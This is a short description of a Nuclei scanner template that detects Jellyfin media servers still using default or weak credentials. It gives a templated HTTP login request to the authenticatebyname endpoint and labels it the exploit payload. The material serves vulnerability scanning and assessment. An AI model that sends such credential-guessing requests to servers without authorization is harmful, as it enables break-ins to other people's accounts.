# Nuclei Template: Jellyfin Console - Default Login
**Template ID:** jellyfin-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`jellyfin-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Weak Jellyfin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /Users/authenticatebyname HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
X-Emby-Authorization: MediaBrowser Client="Jellyfin Web", Device="Browser", DeviceId="DeviceID", Version="Version"

{"Username":"{{username}}","Pw":"{{password}}"}
```

